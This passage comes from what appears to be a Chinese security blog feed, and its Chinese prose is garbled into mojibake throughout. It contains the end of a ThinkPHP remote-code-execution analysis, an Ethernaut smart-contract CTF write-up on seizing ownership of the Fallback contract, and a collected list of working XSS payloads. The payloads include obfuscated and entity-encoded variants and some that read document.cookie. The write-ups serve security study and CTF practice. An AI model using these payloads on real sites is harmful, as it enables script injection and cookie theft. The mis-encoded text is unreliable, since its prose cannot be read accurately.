class="hljs-symbol">@e</span></code></pre><p>åŒ¹é…è·¯ç”±çš„pathsä¹Ÿå°±æ˜¯name/${@phpinfo()}</p><p>æœ‰ç‚¹å¥‡æ€ªï¼Œä¸€èˆ¬ç”¨çš„æ˜¯/ä½œä¸ºåˆ†éš”ç¬¦ä½†è¿™é‡Œç”±äºè¡¨è¾¾å¼é‡Œæœ‰/æ‰€ä»¥ç”¨@åˆ†å‰²è€Œä¸”å¼å­ä¸­åŒ¹é…${@phpinfo()}çš„æ˜¯[^//]ä¹Ÿå°±æ˜¯åªè¦ä¸æ˜¯/å°±å¯ä»¥äº†,é‚£ä¸ºä½•å†™ä¿©ï¼Ÿ</p><p><img src="/img/vul/3.png" srcset="/img/loading.gif" alt=""></p><p>ç„¶åå°±ä¼šæ‰§è¡Œå‘½ä»¤</p><p>å¯ä»¥çœ‹å‡ºï¼Œtpçš„æ–¹æ³•æ˜¯å…ˆç”¨thinkphpå»åˆå§‹åŒ–æ¨¡å—ï¼Œå†ç”¨runtimeå»è°ƒç”¨ä¸€äº›ç±»æ–¹æ³•å¦‚appç±»ï¼Œå…ˆinité…ç½®è·¯ç”±ç­‰ä¿¡æ¯ï¼Œå†execè°ƒç”¨å¯¹åº”çš„modelå’Œaction</p><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> (!preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span>^[A-Za-<span class="hljs-params">z_0</span>-9]+$<span class="hljs-operator">/</span>', MODULE_NAME)</span>) &#123;    throw<span class="hljs-constructor">_exception(L('<span class="hljs-params">_MODULE_NOT_EXIST_</span>')</span>);&#125;å…ˆæ˜¯åŒ¹é…<span class="hljs-keyword">module</span> nameï¼Œå¿…é¡»è¦æ˜¯è‹±æ–‡å’Œæ•°å­—</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>solidity</title>
    <link href="/2020/06/20/solidity/"/>
    <url>/2020/06/20/solidity/</url>
    
    <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a>Ethernaut</h1><p>æœ¬ç¯‡å°†ä»è¿™ä¸ªå¹³å°å¼€å§‹ï¼Œå¹¶ä¸”å°è¯•ç”¨åˆçº¦çš„æ–¹å¼è¿›è¡Œäº¤äº’å®Œæˆï¼Œå› ä¸ºctfä¸­å¤§éƒ¨åˆ†éƒ½æ˜¯è¦åˆçº¦äº¤äº’çš„ã€‚</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>ç¬¬ä¸€å…³ä¸»è¦æ˜¯è®²ä¸€äº›abiçš„è°ƒç”¨æ–¹å¼ã€‚</p><p>æºç </p><pre><code class="hljs typescript">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;contract Instance &#123;  <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> password;  uint8 <span class="hljs-keyword">public</span> infoNum = <span class="hljs-number">42</span>;  <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> theMethodName = <span class="hljs-string">'The method name is method7123949.'</span>;  bool <span class="hljs-keyword">private</span> cleared = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// constructor</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Instance</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> _password</span>) <span class="hljs-title">public</span> </span>&#123;    password = _password;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">'You will find what you need in info1().'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info1</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">'Try info2(), but with "hello" as a parameter.'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info2</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> param</span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">if</span>(keccak256(param) == keccak256(<span class="hljs-string">'hello'</span>)) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-string">'The property infoNum holds the number of the next info method to call.'</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-string">'Wrong parameter.'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info42</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">'theMethodName is the name of the next method.'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">method7123949</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">string</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">'If you know the password, submit it to authenticate().'</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">authenticate</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> passkey</span>) <span class="hljs-title">public</span> </span>&#123;    <span class="hljs-keyword">if</span>(keccak256(passkey) == keccak256(password)) &#123;      cleared = <span class="hljs-literal">true</span>;    &#125;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCleared</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>&#123;    <span class="hljs-keyword">return</span> cleared;  &#125;&#125;</code></pre><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span> contract.address<span class="hljs-meta">&gt;&gt;</span> <span class="hljs-string">"0x077ba30f5810b179f9ac0b0de5d2968023809d80"</span></code></pre><p>å‡½æ•°ä¿®é¥°è¯</p><blockquote><p>view function</p><ul><li><p>Modifying state variables.</p></li><li><p>Emitting events.</p></li><li><p>Creating other contracts.</p></li><li><p>Using selfdestruct.</p></li><li><p>Sending Ether via calls.</p></li><li><p>Calling any function which is not marked view or pure.</p></li><li><p>Using low-level calls.</p></li><li><p>Using inline assembly containing certain opcodes.</p></li><li><pre><code>pragma solidity ^0.4.21;contract constantViewPure{    string name;    uint public age;    function constantViewPure() public{        name = &quot;liushiming&quot;;        age = 29;    }    function getAgeByConstant() public constant returns(uint){        age += 1;  //å£°æ˜ä¸ºconstantï¼Œåœ¨å‡½æ•°ä½“ä¸­åˆè¯•å›¾å»æ”¹å˜çŠ¶æ€å˜é‡çš„å€¼ï¼Œç¼–è¯‘ä¼šæŠ¥warning, ä½†æ˜¯å¯ä»¥é€šè¿‡        return age;  // return 30, ä½†æ˜¯ï¼çŠ¶æ€å˜é‡ageçš„å€¼ä¸ä¼šæ”¹å˜ï¼Œä»ç„¶ä¸º29ï¼    }     function getAgeByView() public view returns(uint){        age += 1; //viewå’Œconstantæ•ˆæœä¸€è‡´ï¼Œç¼–è¯‘ä¼šæŠ¥warningï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡        return age; // return 30ï¼Œä½†æ˜¯ï¼çŠ¶æ€å˜é‡ageçš„å€¼ä¸ä¼šæ”¹å˜ï¼Œä»ç„¶ä¸º29ï¼    }    function getAgeByPure() public pure returns(uint){        return age; //ç¼–è¯‘æŠ¥é”™ï¼pureæ¯”constantå’Œviewéƒ½è¦ä¸¥æ ¼ï¼Œpureå®Œå…¨ç¦æ­¢è¯»å†™çŠ¶æ€å˜é‡ï¼        return 1;    }}<pre><code class="hljs">![](/img/block/1.png)éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé™æ€æ–¹æ³•ä¸éœ€è¦gasï¼Œåº”ä¸ºä¸éœ€è¦åˆçº¦ï¼Œå›¾ä¸­ä¸ºè“è‰²çš„å°±æ˜¯é™æ€æ–¹æ³•å¯ä»¥ç§’getçŠ¶æ€å˜é‡å’Œè¿”å›å€¼ï¼Œè€Œé»„è‰²çš„æ˜¯éœ€è¦äº¤äº’çš„ï¼Œå¹¶ä¸”å¯ä»¥æ”¹å˜åˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œéœ€è¦çŸ¿å·¥æ¥éªŒè¯çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦æ”¯ä»˜gaså¹¶ç¡®å®šã€‚ç¬¬ä¸€å…³ä¸»è¦æ˜¯å¦‚ä½•å’Œåˆçº¦äº¤äº’![](/img/block/2.png)ä¹Ÿå¯ä»¥ç”¨æ§åˆ¶å°å†…è¿›è¡Œäº¤äº’ï¼Œå¯ä»¥çœ‹åˆ°contractå¯¹è±¡ä¸‹çš„æ‰€æœ‰ä¸œè¥¿ï¼Œåº”ä¸ºè¿™ä¸ªæ˜¯å’Œæˆ‘ä»¬çš„æ’ä»¶äº¤äº’è¿‡çš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æ•²playeræ‹¿åˆ°è‡ªå·±çš„åœ°å€ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªå¯¹è±¡ä¸‹çš„æ–¹æ³•ï¼Œåœ¨æ§åˆ¶å°ä¸‹è°ƒç”¨ï¼ˆè¿™ä¸ªæ˜¯è¿™ä¸ªç½‘ç«™å†™çš„jså§ï¼Ÿctfä¸­ç»å¸¸éœ€è¦æˆ‘ä»¬è‡ªå·±å†™åˆçº¦äº¤äº’ï¼Œæ‰€ä»¥æˆ‘å°±ä¸ä¾èµ–è¿™ä¸ªäº†ã€‚ï¼‰ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªabiã€‚<span class="hljs-attribute">abiå¤§æ¦‚å†™äº†ï¼š</span><span class="hljs-attribute"></span>- æ˜¯å¦æ˜¯ä¸ªconstantç±»çš„æ–¹æ³•- å‚æ•°æ€ä¹ˆæ ·ï¼Ÿæœ‰å‡ ä¸ªï¼Ÿ- å‡½æ•°åï¼Ÿ- return- æ˜¯å¦å¯æ”¯ä»˜ï¼Ÿæ¥æ”¶ether## 0x01ç¬¬ä¸€å…³å¼€å§‹è®²ä¸€äº›å·²çŸ¥çš„å®é™…æ¼æ´ </code></pre>pragma solidity ^0.4.18;</code></pre></li></ul></blockquote><p>import â€˜zeppelin-solidity/contracts/ownership/Ownable.solâ€™;<br>import â€˜openzeppelin-solidity/contracts/math/SafeMath.solâ€™;</p><p>contract Fallback is Ownable {</p><p>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public contributions;</p><p>  function Fallback() public {<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  }</p><p>  function contribute() public payable {<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] = contributions[msg.sender].add(msg.value);<br>    if(contributions[msg.sender] &gt; contributions[owner]) {<br>      owner = msg.sender;<br>    }<br>  }</p><p>  function getContribution() public view returns (uint) {<br>    return contributions[msg.sender];<br>  }</p><p>  function withdraw() public onlyOwner {<br>    owner.transfer(this.balance);<br>  }</p><p>  function() payable public {<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  }<br>}</p><pre><code class="hljs plain">æ”¾åœ¨remixé‡Œä¸€å¤§å †æŠ¥é”™ï¼ŒæŠŠå‡½æ•°å†…å®¹å…¨åˆ äº†åªç•™å‡½æ•°å£°æ˜ã€‚</code></pre><p> =&gt; Instance address  0xb1544a094bcb84692709a08553c7e670a1ba2ed4</p><pre><code class="hljs shell">è¿‡å…³æ¡ä»¶1. you claim ownership of the contract2. you reduce its balance to 0okï¼Œæ€è·¯æ¸…æ™°äº†ï¼Œè¦æˆä¸ºåˆçº¦ownerï¼Œå¹¶ä¸”balanceä¸º0è¦æƒ³æˆä¸ºownerï¼š1. è´¡çŒ®1000ethï¼Ÿï¼Ÿï¼Ÿï¼Ÿç»™çˆ·çˆ¬2. è°ƒç”¨fallbackå‡½æ•°ã€‚<span class="hljs-meta">&gt;</span><span class="bash"> <span class="hljs-comment">### Fallback</span></span><span class="hljs-meta">&gt;</span><span class="hljs-meta">&gt;</span><span class="bash"> //</span><span class="hljs-meta">&gt;</span><span class="hljs-meta">&gt;</span><span class="bash"> fallbackå‡½æ•°ï¼Œå›é€€å‡½æ•°ï¼Œæ˜¯åˆçº¦é‡Œçš„ç‰¹æ®Šæ— åå‡½æ•°ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ª[1](https://me.tryblockchain.org/blockchain-solidity-fallback.html<span class="hljs-comment">#fn1)ã€‚å®ƒåœ¨åˆçº¦è°ƒç”¨æ²¡æœ‰åŒ¹é…åˆ°å‡½æ•°ç­¾åï¼Œæˆ–è€…è°ƒç”¨æ²¡æœ‰å¸¦ä»»ä½•æ•°æ®æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ã€‚</span></span><span class="hljs-meta">&gt;</span><span class="hljs-meta">&gt;</span><span class="bash"> å›é€€å‡½æ•°æ˜¯åˆçº¦é‡Œçš„ç‰¹æ®Šå‡½æ•°ï¼Œæ²¡æœ‰åå­—ï¼Œä¸èƒ½æœ‰å‚æ•°ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚ä¸‹é¢æ¥çœ‹ä¸€ä¸ªç®€å•çš„å›é€€å‡½æ•°ä¾‹å­ã€‚</span><span class="hljs-meta">&gt;</span><span class="hljs-meta">&gt;</span><span class="bash"> ```text</span><span class="hljs-meta">&gt;</span><span class="bash"> pragma solidity ^0.4.0;</span><span class="hljs-meta">&gt;</span><span class="bash"> </span><span class="hljs-meta">&gt;</span><span class="bash"> contract SimpleFallback&#123;</span><span class="hljs-meta">&gt;</span><span class="bash">   <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;</span><span class="hljs-meta">&gt;</span><span class="bash">     //fallback <span class="hljs-keyword">function</span></span><span class="hljs-meta">&gt;</span><span class="bash">   &#125;</span><span class="hljs-meta">&gt;</span><span class="bash"> &#125;</span><span class="hljs-meta">&gt;</span></code></pre><p>æ³¨æ„ï¼š</p><p>â€‹    åœ¨è°ƒç”¨sendå‡½æ•°æ—¶å› ä¸ºæ²¡æœ‰å‡½æ•°è°ƒç”¨ä¼šé»˜è®¤è°ƒç”¨fallbackå‡½æ•°ï¼Œæ‰€ä»¥è¦æ³¨æ„fallbackå‡½æ•°è¦åŠ payableï¼Œä¸”åœ¨fallbacké‡Œé¢ä¸èƒ½æœ‰å†™å…¥æ“ä½œï¼Œå› ä¸ºä¼šè°ƒç”¨gasè€Œå¯¼è‡´æ— é™æ¶ˆè€—ï¼ŒDAOå°±æ˜¯è¿™æ ·è¢«é»‘çš„ã€‚</p><blockquote><h3 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h3><p>åŒºå—é“¾æ˜¯æ‰“åŒ…ä¸€ç³»åˆ—äº¤æ˜“çš„åŒºå—ç»„æˆçš„é“¾æ¡ï¼Œæ¯ä¸€ä¸ªäº¤æ˜“â€œæ”¶æ®â€ä¼šåŒ…å«0åˆ°å¤šä¸ªæ—¥å¿—è®°å½•ï¼Œæ—¥å¿—ä»£è¡¨ç€æ™ºèƒ½åˆçº¦æ‰€è§¦å‘çš„äº‹ä»¶ã€‚</p></blockquote><p>å›åˆ°ç¬¬ä¸€å…³ï¼Œ</p><p>è¦è°ƒç”¨fallbackæˆ‘ä»¬éœ€è¦ç»™ä»–è½¬è´¦ï¼Œå¯ä»¥åœ¨consoleé‡Œcontract.contribute({value:1})</p><p>æ¥è½¬è´¦ä¹Ÿå¯ä»¥ç›´æ¥ç”¨metamaskè½¬è´¦ï¼Œæ³¨æ„é‡‘é¢è¦å°äº0.001,å¯ä»¥æ³¨æ„åˆå§‹å‡½æ•°ä¸­æ˜¾ç¤ºçš„ownerçš„ethæ˜¯1000</p><p>é‚£ä¹ˆæˆ‘ä»¬è¦1000/0.001ä¸€æ¬¡è½¬è´¦æ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ç°åœ¨æˆ‘ä»¬éšä¾¿è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°è¯•è¯•ï¼Ÿ</p><p>å¼ä½ å¦ˆçš„ï¼Œä¸æ˜¯å¯ä»¥è°ƒç”¨fallbackå—ï¼Ÿï¼Ÿï¼Ÿæ“</p><p>èµ°å¦ä¸€æ¡ï¼Œsendå‡½æ•°è°ƒç”¨çš„è·¯å­ï¼Œcontract.sendTransaction({value:1})æ¥è°ƒç”¨</p><p><img src="/img/block/3.png" srcset="/img/loading.gif" alt=""></p><p>æˆ‘é€ï¼Ÿï¼Ÿå•¥æ—¶å€™åˆçº¦å˜æˆæˆ‘çš„äº†ï¼Ÿé€å†æ¥ä¸€æ¬¡ã€‚</p><p>=&gt; Instance address        0xcf71f5f466d0da1ae24721a295695322e2b72a96</p><p><img src="/img/block/4.png" srcset="/img/loading.gif" alt=""></p><p>ç°åœ¨åˆçº¦ä¸æ˜¯æˆ‘çš„ä¹Ÿæ²¡è´¡çŒ®ï¼Œå…ˆæ‰“é’±ã€‚</p><p>è„‘å£³ç—›ï¼Œæ‰“é’±ä»–ä¸æ”¶ï¼Œä½ å¦ˆå—¨ï¼</p><p>è¿™æ–°åˆçº¦é‚£ä¹ˆå‚²å¨‡å—ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>å“¦æˆ‘çŸ¥äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿™å°¼ç›å°±æ˜¯å‰é¢è¯´çš„é‚£ç§ï¼Œfallbackå‡½æ•°é‡Œé¢ç›´æ¥å†™äº†çŠ¶æ€é‡ï¼Œæ‰€ä»¥ä¼šä¸æ–­æ¶ˆè€—gasï¼Œåˆšæ‰æˆ‘èƒ½è°ƒç”¨æ˜¯å› ä¸ºåˆçº¦owneræ˜¯æˆ‘çš„äº†ï¼Œæ²¡æœ‰å‘ç”Ÿæ”¹å˜ä¸æ¶ˆè€—gasã€‚ä½†ä¸ºä»€ä¹ˆconsoleé‡Œè°ƒç”¨console.contribute()å°±å¯ä»¥äº†ï¼Ÿï¼Ÿï¼Ÿåº”è¯¥æ˜¯è¿™ç§æ–¹å¼æ²¡æœ‰åƒsendå‡½æ•°é‚£æ ·é»˜è®¤è°ƒç”¨fallback</p><p>æ²¡è§£å†³å¾—åˆ°ï¼Œå…ˆç•™ç€å§ã€‚</p><p>å¥½äº†ç°åœ¨æœ‰äº†è´¡çŒ®ä¹‹åå°±å¯ä»¥ç”¨æ’ä»¶ç»™ä»–æ‰“é’±ï¼Œå¹¶ä¸”è¿™ä¸ªä¹ŸæŠŠowneræ”¹ä¸ºäº†æˆ‘ä»¬ã€‚åˆšæ‰æ˜¯å› ä¸ºæ²¡è´¡çŒ®å°±è¿›ä¸åˆ°fallbacké‡Œæœºä¼šä¸€ç›´å¡ç€</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><ul><li><input disabled="" type="checkbox"> <p>æ€ä¹ˆåœ¨fallbackè¿™é¢˜é‡Œç”¨contributeåˆçº¦äº¤äº’æŠŠvalueä¼ è¿›å»</p><p>1.consoleé‡Œç”¨contract.contribute({value:1})</p><p>é‚£ä¹ˆç”¨abiäº¤äº’çš„æ–¹å¼å‘¢ï¼Ÿ</p></li><li><input checked="" disabled="" type="checkbox"> <p>è¿™ä¸ªwithdrawå‡½æ•°ä¹Ÿä¸èƒ½è°ƒç”¨ã€‚ã€‚ã€‚ã€‚ï¼ˆæ²¡é‚£ä¹ˆå¤šé’±ã€‚ã€‚ã€‚åˆçº¦å†…å°±è¦å°‘å¾ˆå¤šï¼‰</p></li><li><input disabled="" type="checkbox"> </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>æ™ºèƒ½åˆçº¦</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_train</title>
    <link href="/2020/06/19/xss-train/"/>
    <url>/2020/06/19/xss-train/</url>
    
    <content type="html"><![CDATA[<h2 id="xss-fuck"><a href="#xss-fuck" class="headerlink" title="xss fuck"></a>xss fuck</h2><h4 id="æ”¶é›†çš„payload"><a href="#æ”¶é›†çš„payload" class="headerlink" title="æ”¶é›†çš„payload"></a>æ”¶é›†çš„payload</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>" onmouseover=alert(1) a="javascript:alert(1)<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span>123321<span class="hljs-tag">&lt;<span class="hljs-name">isindex</span> <span class="hljs-attr">type</span>=<span class="hljs-string">image</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">isindex</span> <span class="hljs-attr">action</span>=<span class="hljs-string">javascript:alert(1)</span> <span class="hljs-attr">type</span>=<span class="hljs-string">image</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x:alert(alt)</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(src)</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">0</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">x:script</span> <span class="hljs-attr">xmlns:x</span>=<span class="hljs-string">"http://www.w3.org/1999/ xhtml"</span>&gt;</span>alert('xss');<span class="hljs-tag">&lt;/<span class="hljs-name">x:script</span>&gt;</span> "&gt;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4#"</span>&gt;</span>a='',b=!a+a,c=!a+b,d=a+&#123;&#125;,e=b[a++],f=ğ“…‚='',ğ“‚€=!ğ“…‚+ğ“…‚,ğ“„=!ğ“‚€+ğ“…‚,ğ“Š=ğ“…‚+&#123;&#125;,ğ“†£=ğ“‚€ [ğ“…‚++],ğ“Š=ğ“‚€[ğ“‡=ğ“…‚],ğ“¢=++ğ“‡+ğ“…‚,ğ“†—=ğ“Š[ğ“‡+ğ“¢],ğ“‚€[ğ“†—+=ğ“Š[ğ“…‚]+(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]+ğ“„[ğ“¢]+ğ“†£+ğ“Š+ğ“‚€[ğ“‡]+ğ“†—+ğ“†£+ğ“Š[ğ“…‚]+ğ“Š][ğ“†—](ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£+'`ğ“…‚ ğ“¢ ğ“‚€ ğ“„ ğ“†£ ğ“Š ğ“‡`')``a='',b=!a+a,c=!b+a,l=a+&#123;&#125;,d=b[a++],e=b[f=a],m=++f+a,n=l[f+m],b[n+=l[a]+(b.c+l)[a]+c[m]+d+e+b[f]+n+d+l[a]+e][n](c[a]+c[f]+b[m]+e+d+'`a m b c d e f`')``<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"26"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"26"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://carry_yourg?x-oss-process=image/resize,w_100,h_100"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">m</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span>M" alt=""class="chat-avatar"<span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">m</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">" &lt;/noscript&gt;</span></span><span class="hljs-tag"><span class="hljs-string">&lt;style onload= alert(document.domain)//"</span>&gt;</span>*&#123;/*all*/color/*all*/:/*all*/#e84393/*all*/;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>SearchText=%26%2334%3B%3E%3Ca%20href%3D%22%26%230000106%26%23000097%26%230000118%26%23000097%26%230000115%26%23000099%26%230000114%26%230000105%26%230000112%26%230000116%26%23000058%26%23000099%26%230000111%26%230000110%26%230000115%26%230000111%26%230000108%26%230000101%26%23000046%26%230000108%26%230000111%26%230000103%26%23000040%26%23000047%26%230000120%26%230000115%26%230000115%26%23000047%26%23000041%22+onblur%3Dconsole.log+q%3D<span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">svg</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="hljs-meta-string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.1"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Layer_1"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"0px"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"0px"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100px"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100px"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 751 751"</span> <span class="hljs-attr">enable-background</span>=<span class="hljs-string">"new 0 0 751 751"</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">"preserve"</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"image0"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"751"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"751"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"0"</span></span><span class="hljs-tag">    <span class="hljs-attr">href</span>=<span class="hljs-string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>autofocus onfocus=alert(1)style="width: 100vw; height: 100vh; position: fixed; top: 0; left: 0; z-index: 1000;"  å…¨å±<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">"alert(1)"</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>è‡ªåŠ¨è§¦å‘testtest<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert&amp;lpar;document.domain&amp;#41;</span>&gt;</span>testtest<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert&amp;lpar;document.cookie&amp;#41;</span>&gt;</span>testtest"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript&amp;colon;alert&amp;lpar;document.cookie)</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x:alert(alt)</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(src)</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">javascript:alert(1)</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">click</span>&gt;</span></code></pre><h4 id="https-alf-nu-alert1"><a href="#https-alf-nu-alert1" class="headerlink" title="https://alf.nu/alert1"></a><a href="https://alf.nu/alert1" target="_blank" 